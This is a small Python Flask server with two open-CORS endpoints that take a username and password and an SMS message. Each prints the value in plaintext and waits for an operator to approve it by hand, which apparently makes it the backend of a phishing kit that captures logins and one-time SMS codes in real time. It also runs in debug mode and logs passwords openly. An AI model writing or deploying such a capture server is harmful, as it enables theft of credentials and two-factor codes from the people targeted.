from flask import Flask, request, jsonify
from flask_cors import CORS, cross_origin


app = Flask(__name__)
CORS(app)

@app.route('/')
def home():
    return 'Hello, Flask'

@app.route('/process_sign_in', methods=['POST'])
def process_sign_in():
    data = request.json
    name = data['username']
    password = data['password']
    print(f"Name: {name}\nPassword: {password}\n")
    approve = input("Approve this data? (y/n): ")
    if approve.lower() == 'y':
        return jsonify({'status': 'approved', 'data': data}), 200
    else:
        return jsonify({'status': 'rejected', 'reason': 'Manually rejected'}), 400

@app.route('/process_sms', methods=['POST'])
def process_sms():
    data = request.json
    sms = data['sms']
    print(f"SMS: {sms}\n")
    approve = input("Approve this data? (y/n): ")
    if approve.lower() == 'y':
        return jsonify({'status': 'approved', 'data': data}), 200
    else:
        return jsonify({'status': 'rejected', 'reason': 'Manually rejected'}), 400

if __name__ == '__main__':
    app.run(debug=True)

